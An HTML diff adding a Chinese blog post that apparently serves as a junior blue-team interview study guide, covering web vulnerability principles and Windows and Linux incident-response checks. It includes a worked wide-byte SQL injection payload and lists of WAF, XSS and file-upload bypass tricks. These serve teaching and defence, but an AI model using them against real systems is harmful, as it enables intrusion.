@@ -255,6 +255,520 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/" class="post-title-link" itemprop="url">2022初级蓝队面试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-09 15:24:16" itemprop="dateCreated datePublished" datetime="2022-07-09T15:24:16+08:00">2022-07-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-25 12:54:36" itemprop="dateModified" datetime="2022-09-25T12:54:36+08:00">2022-09-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="2022初级蓝队面试"><a href="#2022初级蓝队面试" class="headerlink" title="2022初级蓝队面试"></a>2022初级蓝队面试</h1><p>不是什么大佬，溯源不太会就给个思路</p>
+<p>这里就准备一下我的复习资料吧</p>
+<p>大概会分为几个模块进行复习 漏洞原理  应急响应  常见应急响应案例   溯源  前沿漏洞  中间件漏洞以及常见端口等杂项问题</p>
+<p>以及一个开局话术</p>
+<h1 id="开局话术"><a href="#开局话术" class="headerlink" title="开局话术"></a>开局话术</h1><p>面试官好，我是（叫）xxx ，目前在四川成都，然后目前我们学校已经结课了，我这边<br>确定有时间参加护网，我是从去年开始接触网安或者说 学渗透的，<br>前期主要在 b 站看一些培训视频，，比如小迪的那个渗透培训，后面<br>也报过一些，里面讲到了一些厂<br>商的安全产品和护网行动的内容，包括自己也加了相关的护网交流群，<br>所以自己对护网的一些具体岗位职责，都还是了解比较充分的；也了解<br>一些安全产品（深信服/绿盟态势感知，问就说，不问不说）的使用，<br>所以自己感觉在这次护网中可以承担蓝队初级一些内容；<br>平时的实战经历大多来自src的挖掘，漏洞盒子私密项目，补天专属补天私密，<br>以及各种企业src，类似字节跳动，ucloud，小米魅族等等都提交过有效漏洞<br>挖最多的基本上是xss，csrf和逻辑漏洞，出过几个逻辑漏洞的高危<br>差不多就这些</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="owasp"><a href="#owasp" class="headerlink" title="owasp"></a>owasp</h2><p>注入、失效身份验证和会话管理、敏感信息泄露、XML外部实体注入攻击（XXE）、<br>存取控制中断（差不多就是未授权访问）、安全性错误配置、跨站脚本攻击（XSS）、不安全的反序列化、<br>使用具有已知漏洞的组件、日志记录和监控不足。</p>
+<h2 id="sql："><a href="#sql：" class="headerlink" title="sql："></a>sql：</h2><p>SQL注入-(SQL Injection)是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的”数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱库<br>被删除、甚至整个服务器权限陷)。<br>常见注入手法： 联合查询（union） 报错注入 布尔盲注 时间注入  宽字节注入 堆叠查询  二阶注入</p>
+<p>注入分类：</p>
+<p>按注入点：数字，字符，搜索</p>
+<p>按数据提交方式：get,post,cookie,http</p>
+<p>按执行效果：布尔，时间，报错，联合，堆叠，宽字节</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172850329.png" alt="image-20220616172850329"></p>
+<h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">预编译法；</span><br><span class="line">避免从前端传不必要的值；</span><br><span class="line">对传入的参数进行过滤。</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h3><p>大小写混合，url编码，注释，参数污染，特殊符号绕过比如科学技术法，垃圾数据溢出</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">字符型注入 输入：id=1</span><br><span class="line">MySQL执行的语句为：select* from&lt;表名&gt; where id=&#x27;1&#x27;</span><br><span class="line">若输入：id=1&#x27; and 1=1#</span><br><span class="line">MySQL执行的语句为：select* from&lt;表名&gt; where id=&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line">这样单引号就失去了作用，无法实现闭合</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在地址后先加一个%df，再加单引号，GBK编码中反斜杠的编码为%5c，而%df%5c表示繁体字“連”，所以这时单引号成功逃逸，例如：</span><br><span class="line"></span><br><span class="line">访问1%df&#x27;#，首先进行转义并编码，为：1%df%5c%27%23,即：1連&#x27;#</span><br><span class="line">代入数据库查询语句为：select* from&lt;表名&gt; where id=&#x27;1連&#x27;</span><br><span class="line">配合后面的union查询就可获得我们想要的查询结果。</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次注入的原理"><a href="#二次注入的原理" class="headerlink" title="二次注入的原理"></a>二次注入的原理</h3><p>二次注入原理，主要分为两步<br><strong>第一步</strong>：插入恶意数据<br><strong>第二步</strong>：引用恶意数据<br><strong>第一步</strong>：输入参数1’，函数经过转义函数变成’，参数进入数据库存储还原为1’<br><strong>第二步</strong>：将1’从数据库中取出 取出后直接给变量带入SQL ，SQL注入触发</p>
+<h3 id="堆叠注入的原理"><a href="#堆叠注入的原理" class="headerlink" title="堆叠注入的原理"></a>堆叠注入的原理</h3><p>mysql数据库<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">sql语句</a>的默认结束符是以<code>;</code>结尾，在执行多条SQL语句时就要使用结束符隔开，那么在<code>;</code>结束一条sql语句后继续构造下一条语句，就会一起执行</p>
+<h3 id="updataxml报错原理"><a href="#updataxml报错原理" class="headerlink" title="updataxml报错原理"></a>updataxml报错原理</h3><p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容</p>
+<p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>
+<h3 id="sql注入常见的函数"><a href="#sql注入常见的函数" class="headerlink" title="sql注入常见的函数"></a>sql注入常见的函数</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45744814/article/details/120436723">(83条消息) sql注入常见函数（附图详解）_君莫hacker的博客-CSDN博客_sql注入函数</a></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png" alt="image-20220606160636312"></p>
+<h2 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h2><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>反射型 存储型 dom型</p>
+<p>DOM型xss给予文档对象模型的一种漏洞。DOM是一个与平,编程语言无关的接口,它允许程序或脚本动态访问和更新文档内容,结构和样式,处理后的结果能够成为显示页面的一部分。</p>
+<p>一些xss绕过<br>利用ie双反引号闭合左边双引号的特写<br>大小写<br>双写，编码，双斜杠加十六进这</p>
+<h2 id="csrf漏洞："><a href="#csrf漏洞：" class="headerlink" title="csrf漏洞："></a>csrf漏洞：</h2><p>构造恶意网址借用用户cookie进行操作</p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。<br>绕过思路<br>图片马  mime  %00 0x00  扩展名  .htccess文件绕过   解析漏洞  条件竞争</p>
+<p>绕waf</p>
+<p>字符变异（大小写，多个分号），顺序颠倒（交换name和filename的值），数据重复（filename重复），数据你出（name与filename之间插入垃圾数据，bundary字符串中加入垃圾数据），数据截断（00截断，引号截断）</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png" alt="image-20220616172901546"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png" alt="image-20220616161354087"></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p>
+<p>include() require()</p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>system、eval和exec等函数，是该漏洞攻击成功的主要原因。</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png" alt="image-20220616172913149"></p>
+<h2 id="反序列化漏洞（一会补充"><a href="#反序列化漏洞（一会补充" class="headerlink" title="反序列化漏洞（一会补充"></a>反序列化漏洞（一会补充</h2><p>一、serialize()<br>二、unserialize()</p>
+<h2 id="ssrf以及常见的利用协议"><a href="#ssrf以及常见的利用协议" class="headerlink" title="ssrf以及常见的利用协议"></a>ssrf以及常见的利用协议</h2><p>常见协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file http dict  gopher   常见利用就是ssrf加上redis未授权</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>收集信息：收集客户信息和中毒主机信息，包括样本<br>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等<br>抑制范围：隔离使受害⾯不继续扩⼤<br>深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源<br>清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产<br>产出报告：整理并输出完整的安全事件报告</p>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>常见的应急响应事件分类：Web 入侵：网页挂马、主页篡改、Webshell</p>
+<p>系统入侵：病毒木马、勒索软件、远控后门</p>
+<p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
+<h3 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h3><h4 id="1-1检查系统账号安全（日志-注册表"><a href="#1-1检查系统账号安全（日志-注册表" class="headerlink" title="1.1检查系统账号安全（日志,注册表"></a>1.1检查系统账号安全（日志,注册表</h4><p>查看服务器是否有弱口令，远程管理端口是否对公网开放（根据情况问服务器管理员</p>
+<p>查看服务器是否存在可疑账号，新增账号（下面说怎么查看）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打开cmd</span><br><span class="line">输入lusrmagr.msc命令</span><br><span class="line">如果有管理员群组administrators里面的新增账号，给他删掉</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看服务器是否存在隐藏账号，克隆账号</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CC210231/article/details/124082764">(83条消息) Windows隐藏账户_MountainTop_cc的博客-CSDN博客_windows 查看隐藏账户</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检查方法：</span><br><span class="line">打开注册表，查看管理员对应的键值  打开注册表 regedit（cmd命令</span><br><span class="line">使用D盾查杀</span><br></pre></td></tr></table></figure>
+
+
+
+<p>结合日志，查看管理员登录时间，用户名是否存在异常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Win+R  输入eventvwr.msc  打开事件查看器</span><br><span class="line">导出Windows日志--安全  利用微软官方工具log parser进行分析</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2检查异常端口，进程"><a href="#1-2检查异常端口，进程" class="headerlink" title="1.2检查异常端口，进程"></a>1.2检查异常端口，进程</h4><p>检查端口连接情况，是否有远程连接，可疑连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用netstat -ano 命令查看目前的网络连接，定位可疑的ESTABLISHED</span><br><span class="line">根据netstat命令定位出的PID编号 在通过taskist命令进行进程定位</span><br></pre></td></tr></table></figure>
+
+
+
+<p>进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">开始--运行--输入 msinfo32命令，一次点击“软件环境--正在运行任务”就可以查看到进程的详细信息，比如说进程的路径，进程的id，文件创建日以及启动时间</span><br><span class="line">使用D盾_web查杀工具</span><br><span class="line">或者说用微软官方的porcess explorer进行排查</span><br><span class="line">火绒</span><br><span class="line">查看可疑的进程以及子进程</span><br><span class="line">   没有签名验证信息的进程</span><br><span class="line">   进程的属主</span><br><span class="line">   进程的路径是否合法</span><br><span class="line">   cpu或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure>
+
+
+
+<p>小技巧</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png" alt="image-20220606180504575"></p>
+<h3 id="权限维持排查"><a href="#权限维持排查" class="headerlink" title="权限维持排查"></a>权限维持排查</h3><h4 id="2-1检查服务器是否有异常的启动项"><a href="#2-1检查服务器是否有异常的启动项" class="headerlink" title="2.1检查服务器是否有异常的启动项"></a>2.1检查服务器是否有异常的启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a：登录服务器</span><br><span class="line">系统启动文件夹c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">资源管理器打开“系统启动文件夹”的命令，shell:Common Startup</span><br><span class="line">用户启动文件夹：c:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">资源管理器打开“用户启动文件夹”的命令，shell:startup</span><br><span class="line"></span><br><span class="line">b:点击开始菜单》【运行】，输入msconfig,查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</span><br><span class="line"></span><br><span class="line">c:单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常</span><br><span class="line">三个注册表项：</span><br><span class="line">• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">d:利用安全软件查看启动项，开机时间管理</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2检查计划任务"><a href="#2-2检查计划任务" class="headerlink" title="2.2检查计划任务"></a>2.2检查计划任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:单机【开始】》设置》控制面板》任务计划》查看计划任务属性，便可以发现木马文件的路径</span><br><span class="line">b:cmd》输入at命令，检查计算机与网络上的其他计算机之间的绘画或计划任务，如有，则确认是否为正常连接。（或者 schtasks.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3检查服务自启动项"><a href="#2-3检查服务自启动项" class="headerlink" title="2.3检查服务自启动项"></a>2.3检查服务自启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开始》运行》输入services.msc，注意服务状态和启动类型，检查是否有异常服务</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看系统相关信息"><a href="#查看系统相关信息" class="headerlink" title="查看系统相关信息"></a>查看系统相关信息</h3><p>查看系统补丁</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开始》运行》systeminfo</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找可疑目录及文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看用户目录 C:\Users\</span><br><span class="line">开始》运行，输入`%UerProfile%\Rcent`，分析最近打开可疑文件</span><br><span class="line">回收站，浏览器下载目录，浏览器历史记录</span><br><span class="line">修改时间在创建时间之前的的可疑文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p>找出统一时间范围内创建的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</span><br><span class="line">  a:利用 [Registry Workshop](http://www.torchsoft.com/en/rw_information.html) 注册表编辑器的搜索功</span><br><span class="line">能，可以找到最后写入时间区间的文件。</span><br><span class="line">  b:利用计算机自带文件搜索功能，指定修改时间进行搜索</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动化查杀"><a href="#自动化查杀" class="headerlink" title="自动化查杀"></a>自动化查杀</h3><p>病毒查杀：下载安全软件，更新最新病毒库，进行全盘扫描</p>
+<p>webshell查杀</p>
+<p>检查刚发：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足</p>
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="1-系统日志"><a href="#1-系统日志" class="headerlink" title="1.系统日志"></a>1.系统日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:前提：开启审核策略，若日后系统出现故障，安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息</span><br><span class="line">b:Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”</span><br><span class="line">c:到处应用程序日志，安全日志，系统日志，利用[log parser]进行分析</span><br><span class="line">下载地址：https://www.microsoft.com/en- us/download/details.aspx?id=24659</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Web访问日志"><a href="#2-Web访问日志" class="headerlink" title="2.Web访问日志"></a>2.Web访问日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:找到中间件的web日志，打包到本地方便进行分析</span><br><span class="line">b:推荐工具 windows:用EmEditor进行日志分析，支持大文本，搜索效率还不错</span><br><span class="line">linux下，使用shell命令组合查询分析</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-应用程序日志"><a href="#3-应用程序日志" class="headerlink" title="3.应用程序日志"></a>3.应用程序日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">应用程序日志，包含由应用程序或系统程序记录的事件，主要记录程序运行方</span><br><span class="line">面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人</span><br><span class="line">员可以自行决定监视哪些事件。默认位置：</span><br><span class="line">%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-Windows事件ID说明"><a href="#4-Windows事件ID说明" class="headerlink" title="4.Windows事件ID说明"></a>4.Windows事件ID说明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">• 4624 登录成功</span><br><span class="line">• 4625 登录失败</span><br><span class="line">• 4634 注销成功</span><br><span class="line">• 4647 用户启动的注销</span><br><span class="line">• 4672 使用超级用户（如管理员）进行登录</span><br><span class="line">• 4720 创建用户</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-工具的使用-log-parser"><a href="#5-工具的使用-log-parser" class="headerlink" title="5.工具的使用 log parser"></a>5.工具的使用 log parser</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">• 基本查询结构</span><br><span class="line">• Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot; • 使用Log Parser分析日志</span><br><span class="line">• 登录成功的所有事件</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line">• 指定登录时间范围的事件：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where</span><br><span class="line">TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and</span><br><span class="line">EventID=4624&quot;</span><br><span class="line">• 提取登录成功的用户名和IP：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as</span><br><span class="line">EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as</span><br><span class="line">Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where</span><br><span class="line">EventID=4624&quot;</span><br><span class="line">• 登录失败的所有事件：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where</span><br><span class="line">EventID=4625&quot;</span><br><span class="line">• 提取登录失败用户名进行聚合统计：</span><br><span class="line">• LogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as</span><br><span class="line">EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as</span><br><span class="line">user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as</span><br><span class="line">Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where</span><br><span class="line">EventID=4625 GROUP BY Message&quot;</span><br><span class="line">• 系统历史开关机记录：</span><br><span class="line">• LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message</span><br><span class="line">FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="病毒分析工具"><a href="#病毒分析工具" class="headerlink" title="病毒分析工具"></a>病毒分析工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">• PCHunter：http://www.xuetr.com</span><br><span class="line">• 火绒剑：https://www.huorong.cn</span><br><span class="line">• Process Explorer：https://docs.microsoft.com/zhcn/sysinternals/downloads/process-explorer</span><br><span class="line">• processhacker：https://processhacker.sourceforge.io/downloads.php</span><br><span class="line">• autoruns：</span><br><span class="line">https://docs.microsoft.com/enus/sysinternals/downloads/autoruns</span><br><span class="line">• OTL：https://www.bleepingcomputer.com/download/otl/</span><br><span class="line">• SysInspector：</span><br><span class="line">http://download.eset.com.cn/download/detail/?product=sysinspector</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">• 卡巴斯基：http://devbuilds.kasperskylabs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色</span><br><span class="line">版、最新病毒库）</span><br><span class="line">• 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：</span><br><span class="line">扫描快、一次下载只能用1周，更新病毒库）</span><br><span class="line">• 火绒安全软件：https://www.huorong.cn</span><br><span class="line">• 360杀毒：http://sd.360.cn/download_center.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">• CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn</span><br><span class="line">• 微步在线威胁情报社区：https://x.threatbook.cn</span><br><span class="line">• 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html</span><br><span class="line">• 爱毒霸社区：http://bbs.duba.net</span><br><span class="line">• 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• D盾_Web查杀：http://www.d99net.net/index.asp</span><br><span class="line">• 河马 WebShell 查杀：http://www.shellpub.co</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h3><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png" alt="image-20220615204100713"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png" alt="image-20220616003137358"></p>
+<h4 id="1-1账号安全"><a href="#1-1账号安全" class="headerlink" title="1.1账号安全"></a>1.1账号安全</h4><p>基本使用：</p>
+<p>1.用户信息文件/etc/passwd</p>
